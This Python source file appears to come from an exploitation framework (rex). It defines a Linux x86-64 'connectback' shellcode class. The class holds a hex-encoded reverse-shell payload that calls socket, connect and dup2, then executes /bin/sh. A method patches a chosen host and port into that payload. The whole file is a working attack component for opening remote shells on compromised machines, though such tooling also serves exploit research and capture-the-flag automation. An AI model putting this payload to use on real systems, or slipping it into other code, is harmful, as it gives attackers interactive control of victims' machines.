import socket
import struct
import logging
from rex.exploit.shellcode import Shellcode

l = logging.getLogger("rex.exploit.shellcodes.linux_amd64_connectback")

class LinuxAMD64Connectback(Shellcode):

    # TODO: should be 'linux' once CLE can identify linux files
    supported_platforms = ["unix"]

    arch = "AMD64"

    name = "connectback"

    hex_code = "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c04831f64d31d24152c604240266c7442402%sc7442404%s4889e66a105a41505f6a2a580f054831f66a035e48ffce6a21580f0575f64831ff57575e5a48bf2f2f62696e2f736848c1ef0857545f6a3b580f05"

    def to_raw(self, host, port):
        #pylint:disable=arguments-differ
        '''
        :param ip: string representing the ip address or domain name to connect back to
        :param port: port to connect to on the remote host
        '''

        l.debug("Connecting back to %s:%d", host, port)

        target_ip = socket.gethostbyname(host)
        raw_ip = socket.inet_aton(target_ip).encode('hex')

        if port < 0 or port >= 65535:
            raise ValueError("invalid port specified")

        raw_port = struct.pack("!H", port).encode('hex')

        return (self.hex_code % (raw_port, raw_ip)).decode('hex')
